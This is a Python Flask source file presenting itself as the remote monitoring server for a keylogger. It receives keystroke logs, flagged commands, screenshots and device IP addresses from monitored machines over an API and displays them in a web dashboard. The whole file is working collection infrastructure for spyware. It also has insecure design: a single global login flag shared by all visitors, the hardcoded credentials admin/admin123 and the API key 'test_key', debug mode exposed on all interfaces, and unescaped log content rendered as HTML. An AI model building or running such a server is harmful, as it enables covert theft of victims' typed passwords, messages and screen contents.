"""
Remote monitoring server for the keylogger
Run this on a server to receive and display logs from the keylogger
"""

from flask import Flask, request, jsonify, render_template, redirect, url_for, flash
from markupsafe import Markup
from flask_socketio import SocketIO, emit
from werkzeug.security import check_password_hash, generate_password_hash
import os
import json
import base64
from datetime import datetime
import threading
import time
import uuid
import logging
import re

# Initialize Flask app
app = Flask(__name__)
app.secret_key = os.urandom(24)  # For session management
socketio = SocketIO(app)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('remote_server')

# In-memory data storage (replace with database in production)
devices = {}
logs = []
flags = []
screenshots = []
users = {
    "admin": {
        "password_hash": generate_password_hash("admin123"),  # Default password, change this!
        "role": "admin"
    }
}
api_keys = {
    "test_key": {  # Default API key, change this!
        "name": "Test Key",
        "permissions": ["submit_data"]
    }
}

# Configuration
MAX_LOGS = 1000  # Maximum number of logs to keep in memory
MAX_FLAGS = 100  # Maximum number of flags to keep
MAX_SCREENSHOTS = 50  # Maximum number of screenshots to keep

# Authentication status
authenticated = False

# Routes
@app.route('/')
def index():
    """Home page / dashboard"""
    if not authenticated:
        return redirect(url_for('login'))
        
    return render_template('index.html', 
                         devices=devices, 
                         logs=logs[-50:], 
                         flags=flags,
                         screenshots=screenshots)

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login page"""
    global authenticated
    error = None
    
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        if username in users and check_password_hash(users[username]['password_hash'], password):
            authenticated = True
            return redirect(url_for('index'))
        else:
            error = 'Invalid credentials'
            
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    """Logout and redirect to login page"""
    global authenticated
    authenticated = False
    return redirect(url_for('login'))

@app.route('/devices')
def device_list():
    """List all connected devices"""
    if not authenticated:
        return redirect(url_for('login'))
        
    return render_template('devices.html', devices=devices)

@app.route('/device/<device_id>')
def device_detail(device_id):
    """Show details for a specific device"""
    if not authenticated:
        return redirect(url_for('login'))
        
    if device_id not in devices:
        flash('Device not found', 'error')
        return redirect(url_for('device_list'))
        
    device_logs = [log for log in logs if log['device_id'] == device_id]
    device_flags = [flag for flag in flags if flag['device_id'] == device_id]
    device_screenshots = [ss for ss in screenshots if ss['device_id'] == device_id]
    
    return render_template('device_detail.html',
                         device=devices[device_id],
                         logs=device_logs[-50:],
                         flags=device_flags,
                         screenshots=device_screenshots)

@app.route('/logs')
def log_list():
    """View all logs"""
    if not authenticated:
        return redirect(url_for('login'))
        
    return render_template('logs.html', logs=logs[-100:], devices=devices)

@app.route('/flags')
def flag_list():
    """View all flagged commands"""
    if not authenticated:
        return redirect(url_for('login'))
        
    return render_template('flags.html', flags=flags)

@app.route('/screenshots')
def screenshot_list():
    """View all screenshots"""
    if not authenticated:
        return redirect(url_for('login'))
        
    return render_template('screenshots.html', screenshots=screenshots)

@app.route('/api/ping', methods=['GET'])
def ping():
    """API endpoint to check connection"""
    # Check API key
    api_key = request.headers.get('X-API-Key')
    device_id = request.headers.get('X-Device-ID')
    
    if not api_key or api_key not in api_keys:
        logger.warning(f"Invalid API key in ping: {api_key}")
        return jsonify({"status": "error", "message": "Invalid API key"}), 401
        
    logger.info(f"Ping received from device {device_id}")
    
    # Update device status
    if device_id:
        if device_id not in devices:
            devices[device_id] = {
                "id": device_id,
                "last_seen": datetime.now().isoformat(),
                "ip": request.remote_addr,
                "user_agent": request.headers.get('User-Agent', 'Unknown')
            }
        else:
            devices[device_id]["last_seen"] = datetime.now().isoformat()
            devices[device_id]["ip"] = request.remote_addr
    
    return jsonify({"status": "ok", "message": "Server is running"}), 200

@app.route('/api/data', methods=['POST'])
def receive_data():
    """API endpoint to receive data from keyloggers"""
    # Check API key
    api_key = request.headers.get('X-API-Key')
    device_id = request.headers.get('X-Device-ID')
    
    if not api_key or api_key not in api_keys:
        logger.warning(f"Invalid API key: {api_key}")
        return jsonify({"status": "error", "message": "Invalid API key"}), 401
        
    # Get JSON data
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data provided"}), 400
        
    # Make sure there's a type and device_id
    if "type" not in data or "device_id" not in data:
        return jsonify({"status": "error", "message": "Missing required fields"}), 400
        
    # Process based on data type
    if data["type"] == "log":
        process_log(data)
    elif data["type"] == "flag":
        process_flag(data)
    elif data["type"] == "screenshot":
        process_screenshot(data)
    else:
        return jsonify({"status": "error", "message": "Unknown data type"}), 400
        
    # Update device info
    if device_id:
        if device_id not in devices:
            devices[device_id] = {
                "id": device_id,
                "last_seen": datetime.now().isoformat(),
                "ip": request.remote_addr,
                "user_agent": request.headers.get('User-Agent', 'Unknown')
            }
        else:
            devices[device_id]["last_seen"] = datetime.now().isoformat()
            devices[device_id]["ip"] = request.remote_addr
            
    # Notify connected clients via Socket.IO
    socketio.emit('data_update', {"type": data["type"]})
    
    return jsonify({"status": "ok", "message": "Data received"}), 200

def process_log(data):
    """Process incoming log data"""
    # Add timestamp if not present
    if "timestamp" not in data:
        data["timestamp"] = datetime.now().isoformat()
        
    # Ensure data is in the right format
    if "data" in data and isinstance(data["data"], dict):
        # It's already a dictionary, good to go
        pass
    elif "data" in data and isinstance(data["data"], str):
        # It's a string, which is fine
        pass
    else:
        # Add a placeholder if data is missing or in an unexpected format
        data["data"] = "Activity recorded"
        
    # Add to logs
    logs.append(data)
    
    # Trim logs if too many
    while len(logs) > MAX_LOGS:
        logs.pop(0)
        
    logger.info(f"Log received from device {data['device_id']}")

def process_flag(data):
    """Process incoming flag data"""
    # Add timestamp if not present
    if "timestamp" not in data:
        data["timestamp"] = datetime.now().isoformat()
        
    # Add to flags
    data["id"] = str(uuid.uuid4())
    flags.append(data)
    
    # Trim flags if too many
    while len(flags) > MAX_FLAGS:
        flags.pop(0)
        
    logger.info(f"Flag received from device {data['device_id']}")

def process_screenshot(data):
    """Process incoming screenshot data"""
    # Add timestamp if not present
    if "timestamp" not in data:
        data["timestamp"] = datetime.now().isoformat()
        
    # Add an ID for reference
    data["id"] = str(uuid.uuid4())
    
    # Store the screenshot
    screenshots.append(data)
    
    # Trim screenshots if too many
    while len(screenshots) > MAX_SCREENSHOTS:
        screenshots.pop(0)
        
    logger.info(f"Screenshot received from device {data['device_id']}")

def format_log_content(content):
    """Format log content for better display"""
    if not content:
        return ""
    
    # Format special keys
    content = re.sub(r'\[([A-Z_]+)\]', r'<span class="special-key">[\1]</span>', content)
    
    # Format window changes
    content = re.sub(r'\[Switched to:([^\]]+)\]', r'<div class="window-change">Switched to:\1</div>', content)
    
    # Return the formatted HTML content
    return Markup(content)

# HTML Templates
@app.route('/templates/<template_name>')
def get_template(template_name):
    """Serve HTML templates (for development only)"""
    return render_template(template_name)

# Main entry point
if __name__ == '__main__':
    # Create templates directory if it doesn't exist
    if not os.path.exists('templates'):
        os.makedirs('templates')
        
    # Add the format_log_content function to Jinja environment
    app.jinja_env.globals.update(format_log_content=format_log_content)
        
    # Create basic HTML templates if they don't exist
    templates = {
        'index.html': '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Keylogger Remote Monitoring Dashboard</title>
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
            <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
            <style>
                .card { margin-bottom: 20px; }
                .flag-item { background-color: #fff3cd; }
            </style>
        </head>
        <body>
            <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
                <div class="container">
                    <a class="navbar-brand" href="/">Keylogger Monitor</a>
                    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                        <span class="navbar-toggler-icon"></span>
                    </button>
                    <div class="collapse navbar-collapse" id="navbarNav">
                        <ul class="navbar-nav">
                            <li class="nav-item"><a class="nav-link" href="/">Dashboard</a></li>
                            <li class="nav-item"><a class="nav-link" href="/devices">Devices</a></li>
                            <li class="nav-item"><a class="nav-link" href="/logs">Logs</a></li>
                            <li class="nav-item"><a class="nav-link" href="/flags">Flags</a></li>
                            <li class="nav-item"><a class="nav-link" href="/screenshots">Screenshots</a></li>
                        </ul>
                        <ul class="navbar-nav ms-auto">
                            <li class="nav-item"><a class="nav-link" href="/logout">Logout</a></li>
                        </ul>
                    </div>
                </div>
            </nav>
            
            <div class="container mt-4">
                <h1>Dashboard</h1>
                
                <div class="row">
                    <div class="col-md-4">
                        <div class="card">
                            <div class="card-header">Connected Devices</div>
                            <div class="card-body">
                                <h3>{{ devices|length }}</h3>
                                <a href="/devices" class="btn btn-primary btn-sm">View All</a>
                            </div>
                        </div>
                    </div>
                    
                    <div class="col-md-4">
                        <div class="card">
                            <div class="card-header">Flagged Commands</div>
                            <div class="card-body">
                                <h3>{{ flags|length }}</h3>
                                <a href="/flags" class="btn btn-warning btn-sm">View All</a>
                            </div>
                        </div>
                    </div>
                    
                    <div class="col-md-4">
                        <div class="card">
                            <div class="card-header">Screenshots</div>
                            <div class="card-body">
                                <h3>{{ screenshots|length }}</h3>
                                <a href="/screenshots" class="btn btn-info btn-sm">View All</a>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="row mt-4">
                    <div class="col-md-6">
                        <div class="card">
                            <div class="card-header">Recent Flagged Commands</div>
                            <div class="card-body">
                                {% if flags %}
                                    <div class="list-group">
                                        {% for flag in flags[:5] %}
                                            <div class="list-group-item flag-item">
                                                <div class="d-flex w-100 justify-content-between">
                                                    <h5 class="mb-1">{{ flag.data.command }}</h5>
                                                    <small>{{ flag.timestamp }}</small>
                                                </div>
                                                <p class="mb-1">Device: {{ flag.device_id }}</p>
                                                <small>Window: {{ flag.data.window_title }}</small>
                                            </div>
                                        {% endfor %}
                                    </div>
                                {% else %}
                                    <p>No flagged commands yet.</p>
                                {% endif %}
                            </div>
                        </div>
                    </div>
                    
                    <div class="col-md-6">
                        <div class="card">
                            <div class="card-header">Recent Activity</div>
                            <div class="card-body">
                                {% if logs %}
                                    <div class="list-group">
                                        {% for log in logs[:10] %}
                                            <div class="list-group-item">
                                                <div class="d-flex w-100 justify-content-between">
                                                    <h5 class="mb-1">Activity</h5>
                                                    <small>{{ log.timestamp }}</small>
                                                </div>
                                                <p class="mb-1">Device: {{ log.device_id }}</p>
                                            </div>
                                        {% endfor %}
                                    </div>
                                {% else %}
                                    <p>No activity logs yet.</p>
                                {% endif %}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
            <script>
                // Connect to Socket.IO for real-time updates
                const socket = io();
                socket.on('data_update', function(data) {
                    console.log('Data update received:', data);
                    // Reload the page to show new data
                    // In a production app, you would update just the relevant parts
                    window.location.reload();
                });
            </script>
        </body>
        </html>
        ''',
        
        'login.html': '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login - Keylogger Remote Monitoring</title>
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
            <style>
                body {
                    display: flex;
                    align-items: center;
                    padding-top: 40px;
                    padding-bottom: 40px;
                    background-color: #f5f5f5;
                    height: 100vh;
                }
                .form-signin {
                    width: 100%;
                    max-width: 330px;
                    padding: 15px;
                    margin: auto;
                }
            </style>
        </head>
        <body>
            <main class="form-signin text-center">
                <form method="post">
                    <h1 class="h3 mb-3 fw-normal">Keylogger Monitor</h1>
                    <h2 class="h5 mb-3 fw-normal">Please sign in</h2>
                    
                    {% if error %}
                        <div class="alert alert-danger">{{ error }}</div>
                    {% endif %}
                    
                    <div class="form-floating mb-3">
                        <input type="text" class="form-control" id="username" name="username" placeholder="Username" required>
                        <label for="username">Username</label>
                    </div>
                    
                    <div class="form-floating mb-3">
                        <input type="password" class="form-control" id="password" name="password" placeholder="Password" required>
                        <label for="password">Password</label>
                    </div>
                    
                    <button class="w-100 btn btn-lg btn-primary" type="submit">Sign in</button>
                    <p class="mt-5 mb-3 text-muted">Default: admin / admin123</p>
                </form>
            </main>
        </body>
        </html>
        ''',
        
        'devices.html': '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Devices - Keylogger Remote Monitoring</title>
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
            <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
        </head>
        <body>
            <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
                <div class="container">
                    <a class="navbar-brand" href="/">Keylogger Monitor</a>
                    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                        <span class="navbar-toggler-icon"></span>
                    </button>
                    <div class="collapse navbar-collapse" id="navbarNav">
                        <ul class="navbar-nav">
                            <li class="nav-item"><a class="nav-link" href="/">Dashboard</a></li>
                            <li class="nav-item"><a class="nav-link active" href="/devices">Devices</a></li>
                            <li class="nav-item"><a class="nav-link" href="/logs">Logs</a></li>
                            <li class="nav-item"><a class="nav-link" href="/flags">Flags</a></li>
                            <li class="nav-item"><a class="nav-link" href="/screenshots">Screenshots</a></li>
                        </ul>
                        <ul class="navbar-nav ms-auto">
                            <li class="nav-item"><a class="nav-link" href="/logout">Logout</a></li>
                        </ul>
                    </div>
                </div>
            </nav>
            
            <div class="container mt-4">
                <h1>Connected Devices</h1>
                
                {% if devices %}
                    <div class="table-responsive">
                        <table class="table table-striped">
                            <thead>
                                <tr>
                                    <th>Device ID</th>
                                    <th>IP Address</th>
                                    <th>Last Seen</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                {% for device_id, device in devices.items() %}
                                    <tr>
                                        <td>{{ device_id }}</td>
                                        <td>{{ device.ip }}</td>
                                        <td>{{ device.last_seen }}</td>
                                        <td>
                                            <a href="/device/{{ device_id }}" class="btn btn-primary btn-sm">View Details</a>
                                        </td>
                                    </tr>
                                {% endfor %}
                            </tbody>
                        </table>
                    </div>
                {% else %}
                    <div class="alert alert-info">No devices connected yet.</div>
                {% endif %}
            </div>
            
            <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
            <script>
                // Connect to Socket.IO for real-time updates
                const socket = io();
                socket.on('data_update', function(data) {
                    // Reload on device updates
                    window.location.reload();
                });
            </script>
        </body>
        </html>
        ''',
        
        'device_detail.html': '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Device Details - Keylogger Remote Monitoring</title>
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
            <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
            <style>
                .card { margin-bottom: 20px; }
                .flag-item { background-color: #fff3cd; }
                .log-container { 
                    max-height: 400px; 
                    overflow-y: auto;
                    font-family: monospace;
                    font-size: 0.9rem;
                    background-color: #f8f9fa;
                    padding: 10px;
                    border: 1px solid #dee2e6;
                    border-radius: 0.25rem;
                }
            </style>
        </head>
        <body>
            <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
                <div class="container">
                    <a class="navbar-brand" href="/">Keylogger Monitor</a>
                    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                        <span class="navbar-toggler-icon"></span>
                    </button>
                    <div class="collapse navbar-collapse" id="navbarNav">
                        <ul class="navbar-nav">
                            <li class="nav-item"><a class="nav-link" href="/">Dashboard</a></li>
                            <li class="nav-item"><a class="nav-link" href="/devices">Devices</a></li>
                            <li class="nav-item"><a class="nav-link" href="/logs">Logs</a></li>
                            <li class="nav-item"><a class="nav-link" href="/flags">Flags</a></li>
                            <li class="nav-item"><a class="nav-link" href="/screenshots">Screenshots</a></li>
                        </ul>
                        <ul class="navbar-nav ms-auto">
                            <li class="nav-item"><a class="nav-link" href="/logout">Logout</a></li>
                        </ul>
                    </div>
                </div>
            </nav>
            
            <div class="container mt-4">
                <h1>Device: {{ device.id }}</h1>
                
                <div class="card">
                    <div class="card-header">Device Information</div>
                    <div class="card-body">
                        <div class="row">
                            <div class="col-md-6">
                                <p><strong>Device ID:</strong> {{ device.id }}</p>
                                <p><strong>IP Address:</strong> {{ device.ip }}</p>
                            </div>
                            <div class="col-md-6">
                                <p><strong>Last Seen:</strong> {{ device.last_seen }}</p>
                                <p><strong>User Agent:</strong> {{ device.user_agent }}</p>
                            </div>
                        </div>
                    </div>
                </div>
                
                <ul class="nav nav-tabs mt-4" id="deviceTabs" role="tablist">
                    <li class="nav-item" role="presentation">
                        <button class="nav-link active" id="logs-tab" data-bs-toggle="tab" data-bs-target="#logs" type="button" role="tab">Logs</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="flags-tab" data-bs-toggle="tab" data-bs-target="#flags" type="button" role="tab">Flagged Commands</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="screenshots-tab" data-bs-toggle="tab" data-bs-target="#screenshots" type="button" role="tab">Screenshots</button>
                    </li>
                </ul>
                
                <div class="tab-content" id="deviceTabsContent">
                    <div class="tab-pane fade show active" id="logs" role="tabpanel">
                        <div class="card">
                            <div class="card-header">Recent Logs</div>
                            <div class="card-body">
                                {% if logs %}
                                    <div class="log-container">
                                        {% for log in logs %}
                                            <div class="log-entry">
                                                <span class="text-muted">[{{ log.timestamp }}]</span>
                                                {% if log.data %}
                                                    {{ log.data }}
                                                {% else %}
                                                    Activity recorded
                                                {% endif %}
                                            </div>
                                        {% endfor %}
                                    </div>
                                {% else %}
                                    <p>No logs available for this device.</p>
                                {% endif %}
                            </div>
                        </div>
                    </div>
                    
                    <div class="tab-pane fade" id="flags" role="tabpanel">
                        <div class="card">
                            <div class="card-header">Flagged Commands</div>
                            <div class="card-body">
                                {% if flags %}
                                    <div class="list-group">
                                        {% for flag in flags %}
                                            <div class="list-group-item flag-item">
                                                <div class="d-flex w-100 justify-content-between">
                                                    <h5 class="mb-1">{{ flag.data.command }}</h5>
                                                    <small>{{ flag.timestamp }}</small>
                                                </div>
                                                <p class="mb-1">Window: {{ flag.data.window_title }}</p>
                                            </div>
                                        {% endfor %}
                                    </div>
                                {% else %}
                                    <p>No flagged commands for this device.</p>
                                {% endif %}
                            </div>
                        </div>
                    </div>
                    
                    <div class="tab-pane fade" id="screenshots" role="tabpanel">
                        <div class="card">
                            <div class="card-header">Screenshots</div>
                            <div class="card-body">
                                {% if screenshots %}
                                    <div class="row">
                                        {% for ss in screenshots %}
                                            <div class="col-md-6 col-lg-4 mb-3">
                                                <div class="card">
                                                    <img src="data:image/png;base64,{{ ss.image }}" class="card-img-top" alt="Screenshot">
                                                    <div class="card-body">
                                                        <p class="card-text text-muted">{{ ss.timestamp }}</p>
                                                    </div>
                                                </div>
                                            </div>
                                        {% endfor %}
                                    </div>
                                {% else %}
                                    <p>No screenshots available for this device.</p>
                                {% endif %}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
            <script>
                // Connect to Socket.IO for real-time updates
                const socket = io();
                socket.on('data_update', function(data) {
                    // Only reload if update is for this device
                    window.location.reload();
                });
            </script>
        </body>
        </html>
        ''',
        
        'flags.html': '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Flagged Commands - Keylogger Remote Monitoring</title>
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
            <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
            <style>
                .flag-item { background-color: #fff3cd; }
            </style>
        </head>
        <body>
            <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
                <div class="container">
                    <a class="navbar-brand" href="/">Keylogger Monitor</a>
                    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                        <span class="navbar-toggler-icon"></span>
                    </button>
                    <div class="collapse navbar-collapse" id="navbarNav">
                        <ul class="navbar-nav">
                            <li class="nav-item"><a class="nav-link" href="/">Dashboard</a></li>
                            <li class="nav-item"><a class="nav-link" href="/devices">Devices</a></li>
                            <li class="nav-item"><a class="nav-link" href="/logs">Logs</a></li>
                            <li class="nav-item"><a class="nav-link active" href="/flags">Flags</a></li>
                            <li class="nav-item"><a class="nav-link" href="/screenshots">Screenshots</a></li>
                        </ul>
                        <ul class="navbar-nav ms-auto">
                            <li class="nav-item"><a class="nav-link" href="/logout">Logout</a></li>
                        </ul>
                    </div>
                </div>
            </nav>
            
            <div class="container mt-4">
                <h1>Flagged Commands</h1>
                
                {% if flags %}
                    <div class="list-group mt-4">
                        {% for flag in flags %}
                            <div class="list-group-item flag-item">
                                <div class="d-flex w-100 justify-content-between">
                                    <h5 class="mb-1">{{ flag.data.command }}</h5>
                                    <small>{{ flag.timestamp }}</small>
                                </div>
                                <p class="mb-1">Device: {{ flag.device_id }}</p>
                                <small>Window: {{ flag.data.window_title }}</small>
                            </div>
                        {% endfor %}
                    </div>
                {% else %}
                    <div class="alert alert-info">No flagged commands yet.</div>
                {% endif %}
            </div>
            
            <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
            <script>
                // Connect to Socket.IO for real-time updates
                const socket = io();
                socket.on('data_update', function(data) {
                    if (data.type === 'flag') {
                        window.location.reload();
                    }
                });
            </script>
        </body>
        </html>
        ''',
        
        'screenshots.html': '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Screenshots - Keylogger Remote Monitoring</title>
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
            <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
            <style>
                .screenshot-modal .modal-body img {
                    max-width: 100%;
                    height: auto;
                }
            </style>
        </head>
        <body>
            <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
                <div class="container">
                    <a class="navbar-brand" href="/">Keylogger Monitor</a>
                    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                        <span class="navbar-toggler-icon"></span>
                    </button>
                    <div class="collapse navbar-collapse" id="navbarNav">
                        <ul class="navbar-nav">
                            <li class="nav-item"><a class="nav-link" href="/">Dashboard</a></li>
                            <li class="nav-item"><a class="nav-link" href="/devices">Devices</a></li>
                            <li class="nav-item"><a class="nav-link" href="/logs">Logs</a></li>
                            <li class="nav-item"><a class="nav-link" href="/flags">Flags</a></li>
                            <li class="nav-item"><a class="nav-link active" href="/screenshots">Screenshots</a></li>
                        </ul>
                        <ul class="navbar-nav ms-auto">
                            <li class="nav-item"><a class="nav-link" href="/logout">Logout</a></li>
                        </ul>
                    </div>
                </div>
            </nav>
            
            <div class="container mt-4">
                <h1>Screenshots</h1>
                
                {% if screenshots %}
                    <div class="row mt-4">
                        {% for ss in screenshots %}
                            <div class="col-md-4 col-lg-3 mb-4">
                                <div class="card">
                                    <img src="data:image/png;base64,{{ ss.image }}" class="card-img-top" alt="Screenshot" 
                                         data-bs-toggle="modal" data-bs-target="#screenshotModal{{ loop.index }}">
                                    <div class="card-body">
                                        <h5 class="card-title">Device: {{ ss.device_id[:8] }}...</h5>
                                        <p class="card-text text-muted">{{ ss.timestamp }}</p>
                                    </div>
                                </div>
                                
                                <!-- Modal for full-size view -->
                                <div class="modal fade screenshot-modal" id="screenshotModal{{ loop.index }}" tabindex="-1">
                                    <div class="modal-dialog modal-xl">
                                        <div class="modal-content">
                                            <div class="modal-header">
                                                <h5 class="modal-title">Screenshot from {{ ss.device_id }}</h5>
                                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                                            </div>
                                            <div class="modal-body">
                                                <img src="data:image/png;base64,{{ ss.image }}" class="img-fluid" alt="Screenshot">
                                            </div>
                                            <div class="modal-footer">
                                                <p class="text-muted">Taken at {{ ss.timestamp }}</p>
                                                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        {% endfor %}
                    </div>
                {% else %}
                    <div class="alert alert-info">No screenshots available.</div>
                {% endif %}
            </div>
            
            <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
            <script>
                // Connect to Socket.IO for real-time updates
                const socket = io();
                socket.on('data_update', function(data) {
                    if (data.type === 'screenshot') {
                        window.location.reload();
                    }
                });
            </script>
        </body>
        </html>
        '''
    }
    
    for template_name, content in templates.items():
        template_path = os.path.join('templates', template_name)
        if not os.path.exists(template_path):
            with open(template_path, 'w') as f:
                f.write(content)
            logger.info(f"Created template: {template_name}")
    
    print("Server starting on http://localhost:5000")
    print("Default login: admin / admin123")
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)